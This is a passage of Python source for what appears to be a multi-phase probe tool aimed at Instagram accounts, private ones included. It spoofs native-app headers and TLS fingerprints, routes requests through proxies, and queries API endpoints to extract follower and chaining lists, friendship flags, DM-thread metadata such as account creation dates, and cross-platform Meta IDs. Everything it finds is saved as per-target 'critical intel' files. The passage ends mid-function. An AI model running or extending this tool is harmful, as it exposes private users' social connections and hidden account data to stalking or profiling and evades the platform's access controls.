             '&include_friendship_status=true',
     None, 'discover_chaining_get'),
    ('POST', '/api/v1/discover/chaining/',
     'target_id={pk}&include_friendship_status=true', 'discover_chaining_post'),
    ('POST', '/api/v1/discover/ayml/',
     'phone_id=&module=discover_people&seed_id={pk}', 'discover_ayml_post'),
                                                             
    ('GET', '/api/v1/usertags/{pk}/feed/?count=24',
     None, 'usertags_feed'),
                                                                          
                         
    ('POST', '/api/v1/feed/reels_media/',
     'user_ids={pk}', 'reels_media_post'),
]


def parse_friendship_status(text):
    """Pulls structured friendship metadata out of /friendships/show/ or
    /friendships/show_many/ responses. Returns dict or None."""
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(data, dict):
        return None
                                                       
    if 'following' in data and 'followed_by' in data:
        return {k: data[k] for k in (
            'following', 'followed_by', 'blocking', 'is_private',
            'is_restricted', 'incoming_request', 'outgoing_request',
            'is_bestie', 'is_feed_favorite', 'muting',
            'is_muting_reel', 'is_muting_notes',
            'is_blocking_reel', 'subscribed', 'is_eligible_to_subscribe',
        ) if k in data}
                                                        
    fs = data.get('friendship_statuses') or {}
    if fs and isinstance(fs, dict):
                                           
        return list(fs.values())[0]
    return None


def scan_user_list_markers(text):
    """Returns counts of follower-list-shaped markers. Distinct from the
    media-leak scanner: we're looking for usernames + pks rather than
    image_versions2 / display_uri. Also detects IG rate-limit responses."""
    all_usernames = set(re.findall(r'"username"\s*:\s*"([a-zA-Z0-9._]+)"', text))
    all_pks = set(re.findall(r'"pk"\s*:\s*"?(\d+)"?', text))
    has_more = '"has_more":true' in text
    big_list = '"big_list":true' in text
    next_max = re.search(r'"next_max_id"\s*:\s*"?([^"]+?)"?[,}]', text)
    rate_limited = (
        'Please wait a few minutes' in text
        or '"require_login":true' in text and 'igweb_rollout' in text
    )
    return {
        'usernames_unique': len(all_usernames),
        'pks_unique': len(all_pks),
        'usernames_sample': sorted(all_usernames)[:8],
        'has_more': has_more,
        'big_list': big_list,
        'next_max_id': (next_max.group(1) if next_max else None),
        'rate_limited': rate_limited,
    }


def probe_social_endpoint(target_pk, target_username, method, ep_path,
                           body_template, ep_label, variant, cookies=None,
                           save=False, proxies=None, viewer_pk=''):
    url = f"https://www.instagram.com{ep_path.format(pk=target_pk)}"
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id':       IG_WEB_APP_ID,
        'x-asbd-id':         '129477',
        'x-requested-with':  'XMLHttpRequest',
        'accept':            '*/*',
        'sec-fetch-dest':    'empty',
        'sec-fetch-mode':    'cors',
        'sec-fetch-site':    'same-origin',
        'referer':           f'https://www.instagram.com/{target_username}/',
    })
    if method == 'POST':
        headers['content-type'] = 'application/x-www-form-urlencoded'
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    try:
        if method == 'POST':
            body = (body_template or '').format(pk=target_pk)
            r = requests.post(url, headers=headers, cookies=cookies, data=body,
                               proxies=proxies, timeout=30, allow_redirects=False)
        else:
            r = requests.get(url, headers=headers, cookies=cookies,
                              proxies=proxies, timeout=30, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        return _empty_probe(f'social_{ep_label}', url,
                              f"{variant['name']}__{ep_label}",
                              type(e).__name__)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    list_scan = scan_user_list_markers(r.text)
                                                                             
                                                        
    leaked_pks = list_scan['pks_unique']
    if viewer_pk and viewer_pk in r.text:
        leaked_pks = max(0, leaked_pks - 1)
    label = f"{variant['name']}__{ep_label}"
    if cookies:
        label += '__auth'
    if save:
        save_artifact(target_username, label, r.text, 'json')
    return {
        'kind': f'social_{ep_label}',
        'url': url,
        'label': label,
        'sig': sig,
        'scan': scan,
        'list_scan': list_scan,
        'leaked_pks_estimate': leaked_pks,
        'response': r,
    }


def fmt_list_scan(p):
    ls = p.get('list_scan', {})
    if not ls:
        return ''
    bits = []
    if ls.get('rate_limited'):
        bits.append("RATE_LIMITED")
    if ls['usernames_unique'] > 1:
        bits.append(f"usernames={ls['usernames_unique']}")
    if ls['pks_unique'] > 1:
        bits.append(f"pks={ls['pks_unique']}")
    if ls['has_more']:
        bits.append("has_more")
    if ls['big_list']:
        bits.append("big_list")
    if ls['next_max_id']:
        bits.append(f"cursor={(ls['next_max_id'] or '')[:10]}")
    if bits and ls['usernames_sample']:
        bits.append(f"sample={ls['usernames_sample'][:3]}")
    return ' | '.join(bits)


def run_social_graph_probes(target_username, target_pk, cookies, save, proxies,
                              stop_on_first):
    """Phase 8: every endpoint that could plausibly leak follower/following
    information for the target. Uses one mobile + one desktop variant.

    Session-warmed: hits the profile HTML first to seed cookies/CSRF before
    fanning out to the API endpoints. IG returns different responses to
    cold-start vs warmed sessions (and aggressively rate-limits cold API
    calls)."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'
    selected = ([v for v in HEADER_VARIANTS if v.get('mobile')][:1]
                + [v for v in HEADER_VARIANTS if not v.get('mobile')][:1])
    viewer_pk = (cookies or {}).get('ds_user_id', '')

                                                                        
                                                                         
                                
    warm_h = build_headers(selected[0])
    if cookies:
        warm_h['x-csrftoken'] = cookies['csrftoken']
    try:
        requests.get(f'https://www.instagram.com/{target_username}/',
                      headers=warm_h, cookies=cookies, proxies=proxies,
                      timeout=30, allow_redirects=True)
        time.sleep(0.6)
    except requests.exceptions.RequestException:
        pass

                                                                       
    for variant in selected:
        for kind in ('followers', 'following'):
            url = f'https://www.instagram.com/{target_username}/{kind}/'
            headers = build_headers(variant)
            if cookies:
                headers['x-csrftoken'] = cookies['csrftoken']
            try:
                r = requests.get(url, headers=headers, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=True)
            except requests.exceptions.RequestException as e:
                p = _empty_probe(f'html_{kind}', url,
                                   f"{variant['name']}__html_{kind}"
                                   + ('__auth' if cookies else ''),
                                   type(e).__name__)
                p['list_scan'] = scan_user_list_markers('')
                p['leaked_pks_estimate'] = 0
                probes.append(p)
                print(f"  [{auth_label} {p['label']:<60}] (skipped: redirect/error)")
                continue
            sig = response_signature(r)
            scan = scan_markers(r.text)
            list_scan = scan_user_list_markers(r.text)
            leaked = list_scan['pks_unique']
            if viewer_pk and viewer_pk in r.text:
                leaked = max(0, leaked - 1)
            label = f"{variant['name']}__html_{kind}" + ('__auth' if cookies else '')
            if save:
                save_artifact(target_username, label, r.text, 'html')
            p = {
                'kind': f'html_{kind}',
                'url': url, 'label': label, 'sig': sig,
                'scan': scan, 'list_scan': list_scan,
                'leaked_pks_estimate': leaked, 'response': r,
            }
            probes.append(p)
            print(f"  [{auth_label} {p['label']:<60}] "
                  f"{fmt_signature(p['sig'])} | {fmt_list_scan(p)}")
            if leaked >= 2 and not first_hit:
                first_hit = p
                if stop_on_first:
                    return probes, first_hit
            time.sleep(0.4)

                                                               
    friendship_state = None                                                   
    for variant in selected:
        for method, ep_path, body_tpl, ep_label in SOCIAL_GRAPH_ENDPOINTS:
            p = probe_social_endpoint(
                target_pk, target_username, method, ep_path, body_tpl, ep_label,
                variant, cookies, save, proxies, viewer_pk)
            probes.append(p)
                                                        
            if p.get('response') is not None and not friendship_state:
                if ep_label in ('friendships_show', 'show_many_post'):
                    fs = parse_friendship_status(p['response'].text)
                    if fs:
                        friendship_state = fs
                        p['friendship_state'] = fs
            print(f"  [{auth_label} {p['label']:<60}] "
                  f"{method:<4} HTTP {p['sig']['status']:<3} "
                  f"{p['sig']['bytes']:>5}B | "
                  f"leaked_pks~{p['leaked_pks_estimate']} {fmt_list_scan(p)}")
            if p['leaked_pks_estimate'] >= 2 and not first_hit:
                first_hit = p
                if stop_on_first:
                    return probes, first_hit
            time.sleep(0.3)

    if friendship_state:
        print()
        print(f"  [+] EXTRACTED friendship metadata "
              f"(viewer={viewer_pk} -> target={target_pk}):")
        for k, v in friendship_state.items():
            print(f"      {k:<32} = {v}")

    return probes, first_hit


                                                                                 
                                                                        
                                                                         
                                                                      
                                                                         
                                                                       
                                         

def build_mobile_pigeon_headers(cookies):
    import uuid
    android_id = f'android-{uuid.uuid4().hex[:16]}'
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    pigeon_session = f'UFS-{uuid.uuid4()}-0'
    raw_client_time = f'{int(time.time())}.000'
    return {
        'user-agent': ('Instagram 304.0.0.34.118 Android (33/13; 420dpi; '
                        '1080x2280; samsung; SM-G998B; o1s; exynos2100; en_US; 526478934)'),
        'accept-language':                'en-US',
        'accept-encoding':                ACCEPT_ENCODING,
        'x-ig-app-locale':                'en_US',
        'x-ig-device-locale':             'en_US',
        'x-ig-mapped-locale':             'en_US',
        'x-pigeon-session-id':            pigeon_session,
        'x-pigeon-rawclienttime':         raw_client_time,
        'x-ig-bandwidth-speed-kbps':      '-1.000',
        'x-ig-bandwidth-totalbytes-b':    '0',
        'x-ig-bandwidth-totaltime-ms':    '0',
        'x-bloks-version-id':             ('e8629f53d8e88f1e51b8a6c5d6e6'
                                            '7c2c6b13f5d47b1e5e8c13f5d47b1e5e8c'),
        'x-ig-app-startup-country':       'TR',
        'x-bloks-is-layout-rtl':          'false',
        'x-ig-device-id':                 device_id,
        'x-ig-family-device-id':          family_device_id,
        'x-ig-android-id':                android_id,
        'x-ig-timezone-offset':           '10800',
        'x-ig-www-claim':                 '0',
        'x-ig-app-id':                    IG_MOBILE_APP_ID,
        'x-ig-capabilities':              '3brTv10=',
        'x-ig-connection-type':           'WIFI',
        'x-ig-connection-speed':          '-1kbps',
        'x-fb-http-engine':               'Liger',
        'x-fb-client-ip':                 'True',
        'x-fb-server-cluster':            'True',
        'priority':                       'u=3',
        'accept':                         '*/*',
    }


def probe_dm_thread_context(target_pk, cookies, save=False, proxies=None):
    """The /api/v1/direct_v2/threads/get_by_participants/ endpoint, hit with
    web cookies + mobile-pigeon-style headers, returns a 1.4KB DM context
    payload that includes data NOT visible in the UI:
        - date_joined            (UNIX ts of account creation — UI never shows)
        - reachability_statuses  (whether viewer can DM target)
        - responsiveness_category (target's reply-rate bucket)
        - has_reached_message_request_limit
        - should_show_safety_card  (IG flagged target as risky)
        - is_viewer_unconnected   (confirms follow state)
    Returns dict or None.
    """
    if not cookies or not target_pk:
        return None
    url = ('https://www.instagram.com/api/v1/direct_v2/threads/'
           f'get_by_participants/?recipient_users=%5B{target_pk}%5D')
    h = build_mobile_pigeon_headers(cookies)
    h['x-csrftoken'] = cookies['csrftoken']
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                          proxies=proxies, timeout=30, allow_redirects=False)
    except requests.exceptions.RequestException:
        return None
    if r.status_code != 200 or not r.text.strip().startswith('{'):
        return None
    try:
        data = json.loads(r.text)
    except json.JSONDecodeError:
        return None

    users = data.get('users') or []
    target_user = users[0] if users else {}

    intel = {
        '_endpoint': 'direct_v2/threads/get_by_participants',
        'date_joined_ts': target_user.get('date_joined'),
        'reachability_statuses': data.get('reachability_statuses'),
        'is_viewer_unconnected': data.get('is_viewer_unconnected'),
        'responsiveness_category': data.get('responsiveness_category'),
        'has_reached_message_request_limit':
            data.get('has_reached_message_request_limit'),
        'should_show_safety_card': data.get('should_show_safety_card'),
        'is_appointment_booking_enabled':
            data.get('is_appointment_booking_enabled'),
        'lightweight_intervention_appealable_entity_id':
            data.get('lightweight_intervention_appealable_entity_id'),
        'thread_context_items': data.get('thread_context_items'),
        'pinned_channels_info': target_user.get('pinned_channels_info'),
    }
                                                     
    dj = intel['date_joined_ts']
    if isinstance(dj, (int, float)) and dj > 0:
        try:
            import datetime
            dt = datetime.datetime.fromtimestamp(dj, tz=datetime.timezone.utc)
            intel['date_joined_iso'] = dt.isoformat()
            now = datetime.datetime.now(datetime.timezone.utc)
            intel['account_age_days'] = (now - dt).days
        except (ValueError, OSError, OverflowError):
            pass

    if save:
        out_path = os.path.join(ARTIFACT_ROOT, str(target_pk),
                                  'dm_thread_context.json')
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w', encoding='utf-8') as f:
            json.dump({'raw': data, 'intel': intel}, f, indent=2,
                       ensure_ascii=False)
    return intel


def extract_critical_intel(text):
    """Mines the rich /api/v1/users/<pk>/info/ response for privacy-sensitive
    OSINT data. Even when feed photos are gated, this surface leaks:
      - fbid_v2 / interop_messaging_user_fbid (cross-platform identity)
      - biography entities (linked @-mentioned accounts with their PKs)
      - HD profile picture URLs at multiple resolutions
      - Threads profile URL with xmt token (Meta cross-app link)
      - account state flags (collections, music, fan-club, MV eligibility)
      - profile_pic_id (full media ID, owner ID embedded)
    Returns a structured dict suitable for artifact dump."""
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    user = data.get('user') if isinstance(data, dict) else None
    if not isinstance(user, dict):
        return None

    bio_entities = []
    bwe = user.get('biography_with_entities') or {}
    for ent in bwe.get('entities', []) or []:
        u = ent.get('user') or {}
        if u.get('id') and u.get('username'):
            bio_entities.append({
                'pk': str(u['id']),
                'username': u['username'],
            })

    intel = {
        'identity': {
            'pk': str(user.get('pk') or user.get('pk_id') or ''),
            'instagram_pk': user.get('instagram_pk'),
            'fbid_v2': str(user.get('fbid_v2') or '') or None,
            'interop_messaging_user_fbid': str(
                user.get('interop_messaging_user_fbid') or '') or None,
            'username': user.get('username'),
            'full_name': user.get('full_name'),
            'profile_pic_id': user.get('profile_pic_id'),
            'strong_id__': user.get('strong_id__'),
            'has_anonymous_profile_picture': user.get('has_anonymous_profile_picture'),
        },
        'cross_platform': {
                                                       
            'fbid_v2_facebook_id': str(user.get('fbid_v2') or '') or None,
            'messenger_interop_id': str(
                user.get('interop_messaging_user_fbid') or '') or None,
            'threads_profile_glyph_url': user.get('threads_profile_glyph_url'),
            'is_active_on_text_post_app': user.get('is_active_on_text_post_app'),
            'has_public_tab_threads': user.get('has_public_tab_threads'),
            'show_text_post_app_switcher_badge':
                user.get('show_text_post_app_switcher_badge'),
        },
        'stats': {
            'follower_count': user.get('follower_count'),
            'following_count': user.get('following_count'),
            'media_count': user.get('media_count'),
            'mutual_followers_count': user.get('mutual_followers_count'),
            'total_ar_effects': user.get('total_ar_effects'),
            'highlight_reel_count': user.get('highlight_reel_count'),
            'usertags_count': user.get('usertags_count'),
        },
        'profile_content': {
            'biography': user.get('biography'),
            'biography_with_entities': bwe,
            'biography_email_addresses': user.get('biography_email_addresses'),
            'biography_phone_numbers': user.get('biography_phone_numbers'),
            'external_url': user.get('external_url'),
            'external_lynx_url': user.get('external_lynx_url'),
            'bio_links': user.get('bio_links'),
            'category': user.get('category') or user.get('category_name'),
            'pronouns': user.get('pronouns'),
        },
        'linked_accounts_in_bio': bio_entities,
        'privacy_state': {
            'is_private': user.get('is_private'),
            'is_verified': user.get('is_verified'),
            'is_business': user.get('is_business'),
            'is_meta_verified_label_eligible':
                user.get('is_eligible_for_meta_verified_label'),
            'meta_verified_benefits_info':
                user.get('meta_verified_benefits_info'),
            'account_type': user.get('account_type'),
            'follow_friction_type': user.get('follow_friction_type'),
        },
        'profile_pictures': {
            'profile_pic_url': user.get('profile_pic_url'),
            'hd_profile_pic_url_info': user.get('hd_profile_pic_url_info'),
            'hd_profile_pic_versions': user.get('hd_profile_pic_versions'),
        },
        'account_state': {
            'has_chaining': user.get('has_chaining'),
            'has_highlight_reels': user.get('has_highlight_reels'),
            'has_collab_collections': user.get('has_collab_collections'),
            'has_private_collections': user.get('has_private_collections'),
            'has_videos': user.get('has_videos'),
            'has_music_on_profile': user.get('has_music_on_profile'),
            'has_visible_media_notes': user.get('has_visible_media_notes'),
            'has_visible_clips_tab': user.get('has_visible_clips_tab'),
            'has_unseen_besties_media': user.get('has_unseen_besties_media'),
            'has_fan_club_subscriptions':
                user.get('has_fan_club_subscriptions'),
            'has_exclusive_feed_content':
                user.get('has_exclusive_feed_content'),
            'has_gen_ai_personas_for_profile_banner':
                user.get('has_gen_ai_personas_for_profile_banner'),
            'avatar_status': user.get('avatar_status'),
            'birthday_today_visibility_for_viewer':
                user.get('birthday_today_visibility_for_viewer'),
        },
        'subscription_states': {
            'posts_subscription_status':
                user.get('posts_subscription_status'),
            'reels_subscription_status':
                user.get('reels_subscription_status'),
            'stories_subscription_status':
                user.get('stories_subscription_status'),
            'live_subscription_status': user.get('live_subscription_status'),
        },
        'banner_prompts': user.get('qa_freeform_banner_available_prompts'),
        'profile_context_links': user.get('profile_context_links_with_user_ids'),
        'fan_club_info': user.get('fan_club_info'),
    }
    return intel


def save_critical_intel(target_username, intel):
    if not intel:
        return None
    target_dir = os.path.join(ARTIFACT_ROOT, target_username)
    os.makedirs(target_dir, exist_ok=True)
    out_path = os.path.join(target_dir, 'critical_intel.json')
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(intel, f, indent=2, ensure_ascii=False)
    return out_path


def print_critical_intel(intel):
    """ASCII-safe intel summary (Windows cp1254 console can't print all
    Unicode chars in Turkish/Indian/Cyrillic full names)."""
    def safe(s):
        if s is None:
            return ''
        if isinstance(s, str):
            return s.encode('ascii', errors='replace').decode('ascii')
        return str(s)

    print()
    print('  -- IDENTITY --')
    ident = intel['identity']
    print(f"     IG pk:                   {ident['pk']}")
    print(f"     username:                @{ident['username']}")
    print(f"     full_name:               {safe(ident['full_name'])}")
    print(f"     profile_pic_id (media):  {ident['profile_pic_id']}")
    print()
    print('  -- CROSS-PLATFORM (Meta IDs) --')
    cp = intel['cross_platform']
    if cp['fbid_v2_facebook_id']:
        print(f"     Facebook id (fbid_v2):   {cp['fbid_v2_facebook_id']}")
    if cp['messenger_interop_id']:
        print(f"     Messenger interop_id:    {cp['messenger_interop_id']}")
    if cp['threads_profile_glyph_url']:
        print(f"     Threads URL:             {safe(cp['threads_profile_glyph_url'])[:120]}")
    print()
    print('  -- STATS --')
    s = intel['stats']
    print(f"     followers/following/posts: "
          f"{s['follower_count']}/{s['following_count']}/{s['media_count']}")
    if s['mutual_followers_count'] is not None:
        print(f"     mutual_followers:         {s['mutual_followers_count']}")
    print()
    print('  -- BIOGRAPHY --')
    pc = intel['profile_content']
    if pc['biography']:
        print(f"     bio: {safe(pc['biography'])[:200]}")
    if pc['external_url']:
        print(f"     external_url:            {safe(pc['external_url'])}")
    if pc['bio_links']:
        print(f"     bio_links: {pc['bio_links']}")
    print()
    if intel['linked_accounts_in_bio']:
        print('  -- LINKED ACCOUNTS IN BIO (pk + username) --')
        for la in intel['linked_accounts_in_bio']:
            print(f"     pk={la['pk']:<14} @{la['username']}")
        print()
    print('  -- PROFILE PIC --')
    pp = intel['profile_pictures']
    hd_url = (pp['hd_profile_pic_url_info'] or {}).get('url')
    if hd_url:
        h = (pp['hd_profile_pic_url_info'] or {}).get('height')
        w = (pp['hd_profile_pic_url_info'] or {}).get('width')
        print(f"     HD ({w}x{h}): {hd_url[:140]}")
    if pp['hd_profile_pic_versions']:
        print(f"     HD versions count: {len(pp['hd_profile_pic_versions'])}")
        for v in pp['hd_profile_pic_versions']:
            print(f"       {v.get('width')}x{v.get('height')}: "
                  f"{(v.get('url') or '')[:120]}")
    print()
    print('  -- ACCOUNT STATE FLAGS --')
    a = intel['account_state']
    flags = [k for k, v in a.items() if v is True]
    print(f"     TRUE: {flags}")
    if a.get('avatar_status'):
        print(f"     avatar_status: {a['avatar_status']}")


def extract_chaining_results(text):
    """The mobile-API /api/v1/users/<pk>/info/ endpoint, when hit with the
    full native-app header set, includes a `chaining_results` array. Each
    entry is an account IG's algorithm grouped with the target — typically
    drawn from the target's followers/following, mutual-follow cluster, or
    interest-graph neighbors. For a PRIVATE target, this is a privacy-
    sensitive social-graph leak: we don't see the target's posts, but we
    DO see who's adjacent to them in IG's graph.

    Returns a list of dicts with the privacy-relevant fields per entry."""
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return []
    user = data.get('user') if isinstance(data, dict) else None
    if not isinstance(user, dict):
        return []
    chain = user.get('chaining_results') or user.get('chaining', {}).get('results')
    if not isinstance(chain, list):
        return []
    out = []
    for entry in chain:
        if not isinstance(entry, dict):
            continue
        fs = entry.get('friendship_status') or {}
        chaining_info = entry.get('chaining_info') or {}
        out.append({
            'pk':             entry.get('pk') or entry.get('id'),
            'username':       entry.get('username'),
            'full_name':      entry.get('full_name'),
            'is_private':     entry.get('is_private'),
            'is_verified':    entry.get('is_verified'),
            'profile_pic_url': entry.get('profile_pic_url') or '',
            'profile_pic_id': entry.get('profile_pic_id'),
            'social_context': entry.get('social_context'),
            'profile_chaining_secondary_label':
                entry.get('profile_chaining_secondary_label'),
            'chaining_sources': chaining_info.get('sources'),
            'chaining_algorithm': chaining_info.get('algorithm'),
            'friendship': {
                'following': fs.get('following'),
                'followed_by': fs.get('followed_by'),
                'is_bestie': fs.get('is_bestie'),
                'is_feed_favorite': fs.get('is_feed_favorite'),
                'incoming_request': fs.get('incoming_request'),
                'outgoing_request': fs.get('outgoing_request'),
                'muting': fs.get('muting'),
                'blocking': fs.get('blocking'),
                'is_restricted': fs.get('is_restricted'),
            },
        })
    return out


def save_chaining_results(target_username, chaining):
    """Write extracted chaining results to artifacts/<target>/chaining_results.json."""
    if not chaining:
        return None
    target_dir = os.path.join(ARTIFACT_ROOT, target_username)
    os.makedirs(target_dir, exist_ok=True)
    out_path = os.path.join(target_dir, 'chaining_results.json')
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(chaining, f, indent=2, ensure_ascii=False)
    return out_path


def discover_pk(target_username, cookies, proxies=None):
    """Resolve username -> PK with a rate-limit tolerant fallback.

    ``web_profile_info`` frequently returns HTTP 429 for an otherwise valid
    session. In that case the regular web search endpoint is used and only an
    exact username match is accepted.
    """
    url = (f'https://www.instagram.com/api/v1/users/web_profile_info/'
           f'?username={target_username}')
    h = build_headers(HEADER_VARIANTS[0])
    h.update({
        'x-ig-app-id': IG_WEB_APP_ID,
        'x-asbd-id': '129477',
        'x-requested-with': 'XMLHttpRequest',
        'accept': '*/*',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'referer': f'https://www.instagram.com/{target_username}/',
    })
    if cookies:
        h['x-csrftoken'] = cookies['csrftoken']
    raw_text = None
    try:
        r = requests.get(url, headers=h, cookies=cookies,
                         proxies=proxies, timeout=30)
        raw_text = r.text
        uids = extract_user_ids(r.text)
        pk = uids.get('pk') or uids.get('id')
        if pk:
            return str(pk), r.text
    except requests.exceptions.RequestException:
        pass

    search_url = (
        'https://www.instagram.com/api/v1/web/search/topsearch/'
        f'?context=blended&query={target_username}&count=10'
        '&search_surface=user_search_page')
    search_headers = dict(h)
    search_headers['referer'] = 'https://www.instagram.com/explore/search/'
    try:
        r = requests.get(search_url, headers=search_headers, cookies=cookies,
                         proxies=proxies, timeout=30)
        if r.status_code != 200:
            return None, raw_text or r.text
        data = r.json()
    except (requests.exceptions.RequestException, json.JSONDecodeError,
            ValueError):
        return None, raw_text

    wanted = target_username.lower()
    for item in data.get('users') or []:
        if not isinstance(item, dict):
            continue
        user = item.get('user') if isinstance(item.get('user'), dict) else item
        if str(user.get('username') or '').lower() != wanted:
            continue
        pk = user.get('pk') or user.get('id')
        if pk:
            return str(pk), r.text
    return None, raw_text or r.text


def probe_mobile_pigeon(target_username, target_pk, cookies, save, proxies,
                          full=False):
    """Phase 14: hits the mobile-API endpoints with the full native-app
    header set. The web→mobile-app header hybrid is unusual — IG's gating
    might branch on different signals than for pure-web traffic.

    LEAN default: only `users/{pk}/info/` (THE earner — 60KB rich response
    with chaining_results, critical_intel, dm_layer triggers). All other
    endpoints in the original list confirmed across testing to return
    400/403/404 for non-followers. Pass full=True to include them."""
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'

                                                                            
    endpoints = [
        ('GET',  f'/api/v1/users/{target_pk}/info/',                    'pigeon_user_info'),
    ]
    if full:
        endpoints += [
            ('GET',  f'/api/v1/feed/user/{target_pk}/?count=12',            'pigeon_feed_user'),
            ('GET',  f'/api/v1/feed/user/{target_username}/username/?count=12',
                                                                             'pigeon_feed_username'),
            ('GET',  f'/api/v1/highlights/{target_pk}/highlights_tray/',    'pigeon_highlights_tray'),
            ('POST', f'/api/v1/feed/reels_media/',                          'pigeon_reels_media'),
            ('GET',  f'/api/v1/feed/user/{target_pk}/story/',               'pigeon_story'),
            ('GET',  f'/api/v1/users/{target_pk}/usernameinfo_post_login/', 'pigeon_post_login_info'),
            ('GET',  f'/api/v1/friendships/show/{target_pk}/',              'pigeon_friendships_show'),
        ]

                                                             
                                                                                
    hosts = ('i.instagram.com',) if not full else ('i.instagram.com', 'www.instagram.com')
    for method, path, label in endpoints:
        for host in hosts:
            url = f'https://{host}{path}'
            h = build_mobile_pigeon_headers(cookies)
            if cookies:
                h['x-csrftoken'] = cookies['csrftoken']
            try:
                if method == 'POST':
                    r = requests.post(url, headers=h, cookies=cookies,
                                       data=f'user_ids={target_pk}',
                                       proxies=proxies, timeout=30,
                                       allow_redirects=False)
                else:
                    r = requests.get(url, headers=h, cookies=cookies,
                                      proxies=proxies, timeout=30,
                                      allow_redirects=False)
            except requests.exceptions.RequestException as e:
                continue
            sig = response_signature(r)
            scan = scan_markers(r.text)
            host_short = host.split('.')[0]
            plabel = f'pigeon_{host_short}__{label}'
            if cookies: plabel += '__auth'
            if save:
                save_artifact(target_username, plabel, r.text, 'json')

                                                                      
            chaining = []
            critical_intel = None
            if 'user_info' in label and sig['bytes'] > 5000:
                chaining = extract_chaining_results(r.text)
                critical_intel = extract_critical_intel(r.text)

            p = {
                'kind': f'pigeon_{label}',
                'url': url, 'label': plabel, 'sig': sig,
                'scan': scan, 'response': r,
                'chaining_results': chaining,
                'critical_intel': critical_intel,
            }
            probes.append(p)
            chain_str = f"  chaining={len(chaining)}" if chaining else ''
            print(f"  [{auth_label} {plabel:<54}] "
                  f"{method:<4} HTTP {sig['status']:<3} {sig['bytes']:>5}B  "
                  f"{fmt_scan(scan) or 'no markers'}{chain_str}")
            if (scan['real_hit'] or len(chaining) >= 3) and not first_hit:
                first_hit = p
            time.sleep(0.4)

                                                                          
                                  
    intel = None
    for p in probes:
        if p.get('critical_intel'):
            intel = p['critical_intel']
            break
    if intel:
                                                                               
                                                      
        dm_intel = probe_dm_thread_context(target_pk, cookies, save=save,
                                             proxies=proxies)
        if dm_intel:
            intel['dm_layer'] = dm_intel
        out = save_critical_intel(target_username, intel)
        print()
        print(f"  [+] CRITICAL INTEL extracted")
        print_critical_intel(intel)
        if dm_intel:
            print()
            print('  -- DM-LAYER (date_joined, reachability) --')
            if dm_intel.get('date_joined_iso'):
                print(f"     date_joined:               {dm_intel['date_joined_iso']}"
                      f"  (account age: {dm_intel.get('account_age_days')} days)")
            print(f"     is_viewer_unconnected:     {dm_intel['is_viewer_unconnected']}")
            print(f"     reachability_statuses:     {dm_intel['reachability_statuses']}")
            print(f"     responsiveness_category:   {dm_intel['responsiveness_category']}")
            print(f"     has_reached_msg_req_limit: {dm_intel['has_reached_message_request_limit']}")
            print(f"     should_show_safety_card:   {dm_intel['should_show_safety_card']}")
        if out:
            rel = os.path.relpath(out, os.path.dirname(os.path.abspath(__file__)))
            print(f"  saved -> {rel}")

                                                           
    all_chaining = {}
    for p in probes:
        for c in p.get('chaining_results', []) or []:
            pk = c.get('pk')
            if pk:
                all_chaining[pk] = c
    if all_chaining:
        print()
        print(f"  [+] CHAINING LEAK: {len(all_chaining)} accounts in social cluster "
              f"of @{target_username}")
        for c in sorted(all_chaining.values(),
                         key=lambda x: (not x['friendship']['following'],
                                         x.get('username') or '')):
            mark_priv = ' [PRIVATE]' if c['is_private'] else ''
            mark_ver = ' [VERIFIED]' if c['is_verified'] else ''
            mark_fol = ' (you follow)' if c['friendship']['following'] else ''
            mark_fb = ' (follows you)' if c['friendship']['followed_by'] else ''
                                                                          
                                                  
            full_name = (c['full_name'] or '').encode('ascii',
                                                       errors='replace').decode('ascii')
            try:
                print(f"      pk={c['pk']:<14} @{(c['username'] or '?'):<22} "
                      f"{full_name[:30]:<30}"
                      f"{mark_priv}{mark_ver}{mark_fol}{mark_fb}")
            except UnicodeEncodeError:
                print(f"      pk={c['pk']:<14} @{(c['username'] or '?'):<22}"
                      f"{mark_priv}{mark_ver}{mark_fol}{mark_fb}")
        out = save_chaining_results(target_username, list(all_chaining.values()))
        if out:
            rel = os.path.relpath(out, os.path.dirname(os.path.abspath(__file__)))
            print(f"      saved -> {rel}")

    return probes, first_hit


                                                                             
                                                                            
                                                                       
                                                                          
                                                                          
                                                                           
                                                               

def probe_tls_impersonation(target_username, target_pk, cookies, save, proxies):
    """Phase 15: sends the same probe as Phase 1/2 but with a real Chrome
    TLS fingerprint. If IG's edge stack uses TLS-based filtering, this
    might bypass it."""
    if not HAVE_CURL_CFFI:
        return [_empty_probe('tls_imp', 'n/a',
                              'tls_imp_unavailable',
                              'curl_cffi not installed')], None

    from curl_cffi import requests as cffi
    probes = []
    first_hit = None
    auth_label = '[auth]' if cookies else '[unauth]'

    impersonates = ['chrome131', 'chrome120', 'firefox117', 'safari17_2_ios']
    targets = [
        ('html_root',       f'https://www.instagram.com/{target_username}/'),
        ('api_web_profile', f'https://www.instagram.com/api/v1/users/web_profile_info/'
                            f'?username={target_username}'),
        ('api_user_info',   f'https://i.instagram.com/api/v1/users/{target_pk}/info/'),
    ]

    for impersonate in impersonates:
        for target_label, url in targets:
            h = build_headers(next(v for v in HEADER_VARIANTS if v.get('mobile')))
            if 'api/v1' in url:
                h.update({
                    'x-ig-app-id': IG_WEB_APP_ID, 'x-asbd-id': '129477',
                    'x-requested-with': 'XMLHttpRequest', 'accept': '*/*',
                    'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'referer': f'https://www.instagram.com/{target_username}/',
                })
            if cookies:
                h['x-csrftoken'] = cookies['csrftoken']
            try:
